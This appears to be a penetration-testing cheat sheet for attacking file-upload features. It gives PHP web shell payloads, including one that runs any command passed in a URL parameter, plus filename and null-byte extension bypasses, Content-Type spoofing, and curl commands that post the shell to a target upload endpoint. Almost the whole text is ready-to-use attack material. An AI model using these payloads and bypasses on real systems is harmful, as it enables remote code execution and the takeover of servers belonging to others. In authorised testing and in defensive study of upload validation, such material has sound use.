- Payload:
  - Test if the code was executed
    ```php
    <?php echo "UPLOAD_OK"; ?>
    ```
  - If executed,
    ```php
    <?php echo shell_exec('whoami'); ?>
    <?php system($_GET['cmd']);?>
    ```
- Bypass techniques:
  - Change `shell.php` to `shell.php.jpg`, `shell.png.php`,`shell.php5` or `shell.png.php5`
  - Content-Type spoofing: `curl -F "file=@shell.php;type=image/jpeg"`
    > Change "file" if needed
  - NULL BYTE and Weird suffixes: `shell.php;.jpg`, `shell.php%20`, `shell.php%00.jpg`, `shell.php%0a.png`, `shell.php%0a`, `shell.php%0d%0a`, `shell.php/`, `shell.php.|`, `shell.php....`, `shell.pHp5....`, `shell.php#.png`, `shell.php\x00`, `shell.phpJunk123png`
- curl example:
  ```bash
  curl -i -X POST -F "file=@shell.php;type=application/x-php" https://target/upload
  curl -i -X POST -F "file=@shell.php;type=image/jpeg" https://target/upload
  # Change "file" if needed.
  ```
